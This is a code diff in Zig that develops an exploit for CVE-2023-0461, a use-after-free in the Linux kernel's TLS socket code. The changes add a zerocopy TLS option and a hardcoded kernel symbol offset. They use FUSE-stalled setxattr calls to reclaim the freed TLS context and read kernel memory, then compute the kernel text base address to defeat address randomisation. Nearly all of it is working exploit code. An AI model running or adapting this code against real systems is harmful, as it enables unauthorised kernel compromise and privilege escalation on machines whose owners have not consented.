@@ -19,6 +19,7 @@ const SOL = struct {
 const TLS = struct {
     pub const TX = 1;
     pub const RX = 2;
+    pub const TX_ZEROCOPY_RO = 3;
 };
 
 const F = struct {
@@ -89,7 +90,7 @@ const CallbackHead = extern struct {
 
 const TLSContext = extern struct {
     prot_info: TLSProtInfo,
-    flags_below: u8,
+    flags0: u8,
     // tx_conf: u3,
     // rx_conf: u3,
     // zerocopy_sendfile: bool,
@@ -108,7 +109,7 @@ const TLSContext = extern struct {
     pending_open_record_frags: u8,
     hole1: [4]u8,
     tx_lock: [32]u8,
-    flags: u64,
+    flags1: u64,
     sk_proto: KernelPtr,
     sk: KernelPtr,
     sk_destruct: KernelPtr,
@@ -133,6 +134,9 @@ const iovec_const = extern struct {
 };
 
 const allc = std.heap.page_allocator;
+
+// tls_sw_push_pending_record - {startup_64,_text}
+const tls_sw_push_pending_record_offset: KernelPtr = 0xa8dd30;
 
 pub fn writev(fd: os.fd_t, iov: []const iovec_const) os.WriteError!usize {
     const iov_count = @as(u31, @intCast(iov.len));
@@ -194,12 +198,13 @@ fn retry_connect(sock: os.socket_t, sock_addr: *const os.sockaddr, len: os.sockl
     return last_err;
 }
 
-const Direction = enum(u32) {
+const TLSOpt = enum(u32) {
     TX = TLS.TX,
     RX = TLS.RX,
+    ZC = TLS.TX_ZEROCOPY_RO,
 };
 
-fn setTLSOpt(sk: os.socket_t, dir: Direction) !void {
+fn setTLSOpt(sk: os.socket_t, opt: TLSOpt) !void {
     const crypto = AESGCM128{
         .info = .{
             .version = .TLS13,
@@ -210,8 +215,13 @@ fn setTLSOpt(sk: os.socket_t, dir: Direction) !void {
         .salt = .{ 's', 'a', 'l', 't' },
         .rec_seq = .{ 'r', 's' } ** 4,
     };
+    const c_true: c_uint = 1;
+    const optval = switch (opt) {
+        .TX, .RX => mem.asBytes(&crypto),
+        .ZC => mem.asBytes(&c_true),
+    };
 
-    try os.setsockopt(sk, l.SOL.TLS, @intFromEnum(dir), mem.asBytes(&crypto));
+    try os.setsockopt(sk, l.SOL.TLS, @intFromEnum(opt), optval);
 }
 
 const SyncPipe = struct {
@@ -280,7 +290,7 @@ fn cve_2023_0461() !void {
     defer fuse_dir.close();
     var fuse = try Fuse.init(fuse_dir);
     defer fuse.deinit();
-    const ops = Fuse.Ops{};
+    const ops = Fuse.Ops{ .onSetxattr = null };
 
     const psync = try SyncPipe.init();
     defer psync.deinit();
@@ -316,41 +326,104 @@ fn cve_2023_0461() !void {
         try retry_connect(client_sk1, target_addr_p, addr_sz);
 
         log.info("child: wait for parent to enter setxattr", .{});
-        var got = false;
+        var end = false;
 
-        while (!got) {
-            var req = try fuse.start_read_req();
+        while (!end) {
+            try psync.cont(0);
+
             try fuse.do_one(ops); //GETATTR
             try fuse.do_one(ops); //LOOKUP
 
-            log.info("child: try overwrite xattr", .{});
-            setTLSOpt(target_sk, .RX) catch |e| {
+            log.info("child: wait for parent to allocate xattr value buf", .{});
+            os.nanosleep(1, 0);
+
+            log.info("child: setTLSOpt: ZC", .{});
+            setTLSOpt(target_sk, .ZC) catch |e| {
                 log.err("child: setTLSOpt failed: {}", .{e});
+                end = true;
             };
 
-            log.info("child: read victim data", .{});
+            var end_inner = false;
+            while (!end_inner) {
+                var req = try fuse.start_read_req();
+                var res = Fuse.Response.init(req);
 
-            req = try fuse.start_read_req();
+                switch (req.body) {
+                    .setxattr => |xattr| {
+                        const ctx = mem.bytesAsValue(TLSContext, xattr.value[0..328]);
 
-            switch (req.body) {
-                .setxattr => |xattr| {
-                    log.info("child: read {s}: {}: {s}", .{
-                        xattr.name,
-                        xattr.value.len,
-                        std.fmt.fmtSliceEscapeLower(xattr.value),
-                    });
-                    const ctx: TLSContext = mem.bytesAsValue(TLSContext, xattr.value[0..328]);
-                    log.info("child: read: {}", .{ctx});
+                        for (xattr.value[0..328], 0..) |b, i| {
+                            if (b == 0)
+                                continue;
 
-                    got = ctx.crypto_recv_aes_gcm_128.iv[0] == 'i';
-                },
-                else => unreachable,
+                            log.info("child: read: xattr not zero: {}={}, ctx.flags0={}", .{ i, b, ctx.flags0 });
+                            //end = true;
+                            break;
+                        }
+                        end = true;
+
+                        end_inner = true;
+                    },
+                    else => {
+                        try fuse.do_default(&req, &res);
+                    },
+                }
+
+                if (req.body == .forget)
+                    continue;
+
+                try res.send(fuse.dev.handle);
+                fuse.done_read_req(req);
             }
 
-            fuse.done_read_req(req);
-
-            try fuse.do_one(ops); // SETATTR
+            try fuse.do_one(ops); //SETATTR
         }
+
+        try psync.cont(0);
+
+        try fuse.do_one(ops); //GETATTR sb
+
+        log.info("child: wait for parent to allocate xattr value buf", .{});
+        os.nanosleep(1, 0);
+
+        log.info("child: try overwrite xattr", .{});
+        setTLSOpt(target_sk, .RX) catch |e| {
+            log.err("child: setTLSOpt failed: {}", .{e});
+        };
+
+        log.info("child: read victim data", .{});
+
+        var req = try fuse.start_read_req();
+        var res = Fuse.Response.init(req);
+
+        const push_pending_record = switch (req.body) {
+            .setxattr => |xattr| blk: {
+                log.info("child: read {s}: {}: {s}", .{
+                    xattr.name,
+                    xattr.value.len,
+                    std.fmt.fmtSliceEscapeLower(xattr.value),
+                });
+                const ctx = mem.bytesAsValue(TLSContext, xattr.value[0..328]);
+                log.info("child: read: {}", .{ctx});
+
+                break :blk ctx.push_pending_record;
+            },
+            else => blk: {
+                log.err("child: read: expected xattr, but got {}", .{req.body});
+                res.err(E.OPNOTSUPP);
+                break :blk 0;
+            },
+        };
+
+        try res.send(fuse.dev.handle);
+        fuse.done_read_req(req);
+
+        try fuse.do_one(ops); //SETATTR
+
+        try psync.cont(3);
+
+        const kernel_text = push_pending_record - tls_sw_push_pending_record_offset;
+        log.info("child: kernel .text = {x}", .{kernel_text});
 
         try psync.cont(4);
 
@@ -383,19 +456,17 @@ fn cve_2023_0461() !void {
     log.info("parent: wait for deferred free", .{});
 
     const name: [:0]const u8 = "user.bar";
-    var tmp_dir = try Fuse.getTmpDir(env);
-    defer tmp_dir.close();
     const xattr_path: [:0]const u8 = "/tmp/fuse-cve-2023-0461/foo";
 
-    os.nanosleep(5, 0);
+    os.nanosleep(6, 0);
 
-    while (psync.retry(4)) {
+    while (try psync.retry(3)) {
         const res = Fuse.setxattr(@ptrCast(xattr_path), name, &tls_sw_ctx_rx, tls_sw_ctx_rx.len, 0);
         const err = os.errno(res);
         log.info("parent: setxattr: {s}: {s}: {}", .{ xattr_path, name, err });
     }
 
-    try psync.wait(5);
+    try psync.wait(4);
 
     log.info("Goodbye!", .{});
 }
